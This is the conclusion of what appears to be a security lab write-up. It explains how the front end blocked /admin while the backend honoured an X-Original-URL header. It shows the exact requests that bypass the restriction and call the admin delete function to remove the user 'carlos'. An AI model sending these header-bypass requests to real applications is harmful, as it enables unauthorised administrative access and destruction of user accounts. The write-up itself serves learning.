Conclusion

The application was vulnerable to an HTTP Header-Based Access Control Bypass because the front-end and backend interpreted the requested URL differently.

Direct access to:

/admin

was blocked, but the following request bypassed the restriction:

GET /
X-Original-URL: /admin

The same technique was then used to invoke the administrative deletion functionality:

GET /?username=carlos
X-Original-URL: /admin/delete

The backend interpreted the request as:

/admin/delete?username=carlos

allowing the attacker to delete the target user.

